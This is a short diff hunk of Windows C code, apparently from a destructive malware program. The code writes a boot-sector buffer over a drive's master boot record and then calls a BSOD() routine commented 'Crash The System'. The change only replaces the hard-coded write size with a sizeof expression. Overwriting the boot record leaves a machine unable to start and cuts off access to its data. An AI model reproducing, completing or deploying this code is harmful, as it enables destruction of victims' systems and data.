@@ -16,7 +16,7 @@ INT APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmd
 		return -1;
 	}
 	SetFilePointer(hDrive, 0, 0, FILE_BEGIN);
-	WriteFile(hDrive, MBR_BOOT, 2560, NULL, NULL);
+	WriteFile(hDrive, MBR_BOOT, sizeof(MBR_BOOT) / sizeof(BYTE), NULL, NULL);
 	CloseHandle(hDrive);
 	BSOD(); // Crash The System | BLUE SCREEN OF death
 	return 0;
